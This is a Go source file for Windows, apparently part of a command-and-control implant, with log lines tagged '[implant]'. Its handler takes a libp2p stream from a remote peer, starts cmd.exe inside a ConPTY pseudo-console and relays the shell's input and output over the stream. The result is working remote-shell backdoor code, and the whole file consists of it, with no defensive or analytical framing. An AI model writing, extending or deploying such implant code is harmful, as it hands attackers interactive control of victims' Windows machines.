//go:build windows

package core

import (
	"encoding/binary"
	"io"
	"log"
	"unsafe"

	"github.com/libp2p/go-libp2p/core/network"
	"golang.org/x/sys/windows"
)

var (
	modKernel32                        = windows.NewLazySystemDLL("kernel32.dll")
	procCreatePseudoConsole            = modKernel32.NewProc("CreatePseudoConsole")
	procClosePseudoConsole             = modKernel32.NewProc("ClosePseudoConsole")
	procInitializeProcThreadAttributeList = modKernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute      = modKernel32.NewProc("UpdateProcThreadAttribute")
)

type coord struct {
	X, Y int16
}

func (c coord) pack() uintptr {
	return uintptr((int32(c.Y) << 16) | int32(c.X))
}

type pipeHandle struct {
	h windows.Handle
}

func (p *pipeHandle) Read(b []byte) (int, error) {
	var n uint32
	err := windows.ReadFile(p.h, b, &n, nil)
	return int(n), err
}

func (p *pipeHandle) Write(b []byte) (int, error) {
	var n uint32
	err := windows.WriteFile(p.h, b, &n, nil)
	return int(n), err
}

func (p *pipeHandle) Close() error {
	return windows.CloseHandle(p.h)
}

func (a *Agent) handleShellStream(s network.Stream) {
	defer s.Close()
	remotePeer := s.Conn().RemotePeer()

	var rows, cols uint16
	if err := binary.Read(s, binary.LittleEndian, &rows); err != nil {
		log.Printf("[implant] read shell rows: %v", err)
		return
	}
	if err := binary.Read(s, binary.LittleEndian, &cols); err != nil {
		log.Printf("[implant] read shell cols: %v", err)
		return
	}
	if rows < 10 || cols < 10 {
		rows = 30
		cols = 120
	}
	co := coord{X: int16(cols), Y: int16(rows)}
	log.Printf("[implant] shell using rows=%d cols=%d", rows, cols)

	if err := procCreatePseudoConsole.Find(); err != nil {
		log.Printf("[implant] ConPTY not available: %v", err)
		return
	}

	var hPtyIn, hCmdIn windows.Handle
	var hCmdOut, hPtyOut windows.Handle
	if err := windows.CreatePipe(&hPtyIn, &hCmdIn, nil, 0); err != nil {
		log.Printf("[implant] pipe in: %v", err)
		return
	}
	if err := windows.CreatePipe(&hCmdOut, &hPtyOut, nil, 0); err != nil {
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		log.Printf("[implant] pipe out: %v", err)
		return
	}

	var hPC windows.Handle
	ret, _, _ := procCreatePseudoConsole.Call(
		co.pack(),
		uintptr(hPtyIn),
		uintptr(hPtyOut),
		0,
		uintptr(unsafe.Pointer(&hPC)),
	)
	if ret != 0 {
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		log.Printf("[implant] create pty failed: ret=0x%x", ret)
		return
	}
	log.Printf("[implant] ConPTY created, hPC=0x%x", uintptr(hPC))

	var attrList [1024]byte
	var sz uintptr
	procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&sz)))
	ret, _, _ = procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		1, 0,
		uintptr(unsafe.Pointer(&sz)),
	)
	if ret == 0 {
		log.Printf("[implant] init attr list failed")
		procClosePseudoConsole.Call(uintptr(hPC))
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		return
	}

	ret, _, _ = procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		0,
		0x00020016,
		uintptr(hPC),
		unsafe.Sizeof(hPC),
		0, 0,
	)
	if ret == 0 {
		log.Printf("[implant] update attr failed")
		procClosePseudoConsole.Call(uintptr(hPC))
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		return
	}

	cmdW, err := windows.UTF16PtrFromString("cmd.exe")
	if err != nil {
		procClosePseudoConsole.Call(uintptr(hPC))
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		return
	}

	si := windows.StartupInfoEx{}
	si.StartupInfo.Cb = uint32(unsafe.Sizeof(windows.StartupInfo{}) + unsafe.Sizeof(&attrList[0]))
	si.StartupInfo.Flags = windows.STARTF_USESTDHANDLES
	si.ProcThreadAttributeList = (*windows.ProcThreadAttributeList)(unsafe.Pointer(&attrList[0]))

	pi := new(windows.ProcessInformation)
	err = windows.CreateProcess(
		nil, cmdW,
		nil, nil,
		false,
		windows.EXTENDED_STARTUPINFO_PRESENT|windows.CREATE_UNICODE_ENVIRONMENT,
		nil, nil,
		&si.StartupInfo,
		pi,
	)
	if err != nil {
		log.Printf("[implant] create process: %v", err)
		procClosePseudoConsole.Call(uintptr(hPC))
		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
		return
	}

	windows.CloseHandle(pi.Thread)
	log.Printf("[implant] shell started via ConPTY for %s", remotePeer.String())

	inPipe := &pipeHandle{h: hCmdIn}
	outPipe := &pipeHandle{h: hCmdOut}

	done := make(chan struct{}, 2)

	go func() {
		io.Copy(inPipe, s)
		inPipe.Close()
		procClosePseudoConsole.Call(uintptr(hPC))
		done <- struct{}{}
	}()

	go func() {
		io.Copy(s, outPipe)
		outPipe.Close()
		done <- struct{}{}
	}()

	<-done
	procClosePseudoConsole.Call(uintptr(hPC))
	s.Close()

	<-done

	windows.WaitForSingleObject(pi.Process, 5000)
	windows.CloseHandle(pi.Process)

	log.Printf("[implant] shell ended for %s", remotePeer.String())
}
